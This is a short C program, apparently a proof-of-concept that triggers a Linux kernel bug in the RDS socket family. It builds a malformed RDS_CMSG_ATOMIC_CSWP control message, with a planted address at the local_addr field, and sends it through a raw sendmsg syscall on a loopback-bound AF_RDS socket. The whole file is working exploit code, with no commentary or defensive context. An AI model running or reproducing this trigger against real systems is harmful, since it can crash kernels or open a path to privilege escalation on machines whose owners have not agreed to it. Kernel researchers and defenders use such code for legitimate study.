#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <linux/rds.h>
#include <sys/syscall.h>

#define BUF_SIZE 4096

void trigger_bug()
{
    struct sockaddr_in sin;
    struct msghdr msg;
    char buf[BUF_SIZE];
    struct cmsghdr cmsg;

    memset(&sin, 0, sizeof(struct sockaddr));
    memset(&msg, 0, sizeof(msg));
    memset(buf, 0x40, BUF_SIZE);
    memset(&cmsg, 0, sizeof(cmsg));

    int fd = socket(AF_RDS, 5, 0);
    if (fd < 0){
        printf("socket(AF_RDS): %m\n");
        return;
    }
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(2000);
    sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    bind(fd, (struct sockaddr *)&sin, sizeof(sin));

    cmsg.cmsg_len = BUF_SIZE;
    cmsg.cmsg_type = RDS_CMSG_ATOMIC_CSWP;
    cmsg.cmsg_level = SOL_RDS;
    memcpy(&buf[0], &cmsg, sizeof(cmsg));
    *(u_int64_t *)(buf + 0x18) = 0x40404000; // args->local_addr

    msg.msg_name = &sin;
    msg.msg_namelen = sizeof(sin);
    msg.msg_iov = NULL;
    msg.msg_iovlen = 0;
    msg.msg_control = buf;
    msg.msg_controllen = BUF_SIZE;
    msg.msg_flags = MSG_DONTROUTE | MSG_PROXY | MSG_WAITALL;

    syscall(SYS_sendmsg, fd, &msg, 0);
}

int main()
{
    trigger_bug();
    return 0;
}